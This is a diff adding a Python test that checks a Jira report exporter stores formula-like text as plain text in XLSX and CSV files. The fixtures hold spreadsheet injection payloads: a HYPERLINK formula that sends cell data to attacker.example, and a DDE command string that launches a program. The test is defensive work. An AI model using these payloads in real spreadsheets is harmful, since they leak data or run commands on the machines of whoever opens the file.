@@ -189,3 +189,51 @@ def test_reduced_toolbar() -> None:
     assert '"toImage", svg], ["zoom2d", "pan2d", "resetScale2d"]' in CHART_SCRIPT
     assert "displaylogo: false" in CHART_SCRIPT
     assert 'indexOf("https://") === 0' in CHART_SCRIPT  # bars open only https Jira links
+
+
+FORMULAS = (
+    '=HYPERLINK("https://attacker.example/?d="&A3,"Open")',
+    "=1+1",
+    "+1+1",
+    "-2+3",
+    "@SUM(A1)",
+    "\t=1",
+    "\r=1",
+)
+
+
+def formula_result() -> ReportResult:
+    rows = tuple((text, 3, -1.5) for text in (*FORMULAS, "plain", "a=b"))
+    return ReportResult(
+        report_id=ReportId.STATUS_SUMMARY,
+        title="t",
+        tables=(Table(name="cells", columns=("=summary", "n", "x"), rows=rows),),
+        figure=None,
+        summary=("=cmd|' /C calc'!A0",),
+    )
+
+
+def test_spreadsheets_never_contain_formulas(ctx: ReportContext) -> None:
+    """PB-03: Jira text that starts like a formula stays text in XLSX and CSV exports."""
+    result = formula_result()
+    exporters = load_exporters()
+
+    workbook = load_workbook(
+        io.BytesIO(exporters[ExportFormat.XLSX].render(result, ctx.plan, NOW).content)
+    )
+    cells = [c for ws in workbook.worksheets for row in ws.iter_rows() for c in row]
+    text = list(
+        csv.reader(
+            io.StringIO(exporters[ExportFormat.CSV].render(result, ctx.plan, NOW).content.decode())
+        )
+    )
+
+    assert not [c.coordinate for c in cells if c.data_type == "f"]
+    sheet = {c.value for c in cells}
+    assert set(FORMULAS) <= sheet  # the exact text, stored as text
+    assert -1.5 in sheet  # numbers stay numbers
+    fields = [f for row in text for f in row]
+    texts = [f for f in fields if not re.fullmatch(r"-?\d+(\.\d+)?", f)]  # numbers are numbers
+    assert not [f for f in texts if f.startswith(("=", "+", "-", "@", "\t", "\r"))]
+    assert {f"'{f}" for f in FORMULAS} <= set(fields)
+    assert {"plain", "a=b", "3", "-1.5"} <= set(fields)  # only text cells are changed
